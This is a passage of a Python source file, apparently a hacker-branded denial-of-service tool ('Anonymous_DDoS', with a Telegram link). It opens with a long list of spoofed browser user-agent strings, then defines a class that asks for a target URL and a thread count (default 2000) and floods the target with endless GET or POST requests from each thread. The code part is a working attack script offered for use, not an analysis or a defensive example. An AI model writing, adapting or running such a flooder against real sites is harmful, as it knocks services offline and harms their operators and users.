"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MAXTAB Q8 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.46 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)"
"Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3)"
"NerdyBot"
"Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20110204 Firefox/4.0b12pre"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101128 Firefox/4.0b8pre"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CPNTDF; BRI/1)"
"Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.7.0"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.6334; U; en) Presto/2.12.423 Version/12.16"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3; rctw)"
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.11 NintendoBrowser/4.3.0.11224.US"
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10512"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 4.1; en-us; sdk Build/MR1) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.1 Safari/534.30"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/43.3.3.185 Chrome/43.0.2357.81 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; yie9)"
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 UBrowser/5.4.4237.1024 Safari/537.36"
"Mozilla/5.0 (iPod touch; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Linux; U; Android 4.4.4; fi-fi; GT-I9305 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Linux; U; Android 2.3.6; tr-tr; LG-E400 Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MMS/LG-Android-MMS-V1.2"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/43.3.3.185 Chrome/43.0.2357.81 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; RRHSO_BLD1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322; .NET4.0C; RRHSO_BLD1)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; fr; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C)"
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/534.57.7 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.7"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.50 (KHTML, like Gecko) Version/9.0 Safari/601.1.50"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MATM; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0"
"Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.2.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; ASU2JS)"
"Mozilla/5.0 (Linux; Ubuntu 14.04 like Android 4.4) AppleWebKit/537.36 Chromium/35.0.1870.2 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; FunWebProducts; GTB7.5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; COOEE)"
"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F69"
"Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 640 XL LTE Dual SIM) like Gecko"
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3)"
"Opera/9.80 (Android; Opera Mini/7.5.33361/37.6334; U; en) Presto/2.12.423 Version/12.16"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB7.5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; InfoPath.2; .NET CLR 3.0.30729)"
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.12) Gecko/20100101 Firefox/21.0 WordPress.com mShots"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1"
"Mozilla/5.0 (Linux; Android 5.0.2; LG-D802/V30d Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Mobile Safari/537.36"
"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B440 Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko"
"Mozilla/5.0 (compatible; WOW64; MSIE 10.0; Windows NT 6.2)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; tb-webde/2.6.4)"
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.5029 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36"
"Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H8 Safari/6533.18.5"
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.2039.US Safari/537.1"
"Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36"
"Opera/9.80 (Linux armv6l; Opera TV Store/5599; (SonyBDP/BDV13)) Presto/2.12.362 Version/12.11"
"Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50728)"
"Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebKit/537.42 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.42"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 535) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; BRI/1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)" 
]


    amount = 0
    USER_AGENT = ""

    def __init__(self, seq, type):
        self.seq = seq
        self.type = type

    def run(self):
        try:
            while True:
                if self.type == 1:
                    self.postAttack(Dos.url)
                elif self.type == 2:
                    self.sslPostAttack(Dos.url)
                elif self.type == 3:
                    self.getAttack(Dos.url)
                elif self.type == 4:
                    self.sslGetAttack(Dos.url)
        except Exception:
            pass

    @staticmethod
    def main():
        url = ""
        Dos.amount = 0
        dos = Dos(0, 0)
        url = input("""\x1b[38;2;0;255;189m|•|›››[TARGET] : \033[1;m""")
        

        parsed_url = urlparse(url)

        print(f"""\x1b[38;2;0;255;189m|•|›››[CHECKING TO {url} ] : \033[1;m""")
        if parsed_url.scheme == "http":
            dos.checkConnection(url)
        else:
            dos.sslCheckConnection(url)

        print("""\x1b[38;2;0;255;189mWellcome To SocketMethods: \033[1;m""")

        amount= input("""\x1b[38;2;0;255;189m|•|›››[THREADS] : \033[1;m""")
        if amount is None or amount == "":
            Dos.amount = 2000
        else:
            Dos.amount = int(amount)

        option = input("""\x1b[38;2;0;255;189m|•|›››[METHODS(get/http)] : \033[1;m""")
        ioption = 1
        if option.lower() == "get":
            if parsed_url.scheme == "http":
                ioption = 3
            else:
                ioption = 4
        else:
            if parsed_url.scheme == "http":
                ioption = 1
            else:
                ioption = 2

        time.sleep(1)

        print("""\x1b[38;2;0;255;189m|•|›››[Starting To Attack]\033[1;m""")
        threads = []
        for i in range(Dos.amount):
            t = threading.Thread(target=Dos(i, ioption).run)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print("Attack Error Because The Connect To Website Unavailable")

    def checkConnection(self, url):
        Write.Print(f"Checking Connection", Colors.yellow_to_green, interval=0.0002)
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            if response.status_code == 200:
                Write.Print(f"Successful connection!!!!", Colors.yellow_to_green, interval=0.0002)
            Dos.url = url
        except requests.exceptions.RequestException as e:
        	Write.Print(f"https://t.me/T_GRAY_Hacker tool Python\n", Colors.red, interval=0.0002)
        sys.exit()

    def sslCheckConnection(self, url):
        print("""\x1b[38;2;0;255;189m|•|›››[\x1b[38;2;224;0;255m Checking The Connect SSL ]\033[1;m""")
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            if response.status_code == 200:
                print(f"""\x1b[38;2;0;255;189m|•|›››[Anonymous_DDoS] : \033[1;m""")
            Dos.url = url
        except requests.exceptions.RequestException as e:
            Write.Print(f"Invalid Url Please Return The Panel\n", Colors.red, interval=0.0002)
            sys.exit()

    def postAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=False)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m {url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} ", Colors.red_to_green, interval=0.0002)

    def getAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n ", Colors.red_to_green, interval=0.0002)

    def sslPostAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=True)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n ", Colors.red_to_green, interval=0.0002)

    def sslGetAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            print(f"""\x1b[38;2;0;255;189m|•|›››\x1b[38;2;224;0;255m[Attack \x1b[38;2;224;0;298m{url} Complete \x1b[38;2;0;255;189m{response.status_code} \x1b[38;2;0;255;189mThreads: \x1b[38;2;224;0;255m{self.seq} ]\033[1;m""")
        except requests.exceptions.RequestException as e:
            Write.Print(f"Attack {url} Failure {response.status_code} Threads: {self.seq} \n", Colors.red_to_green, interval=0.0002)


if __name__ == "__main__":
    Dos.main()
                
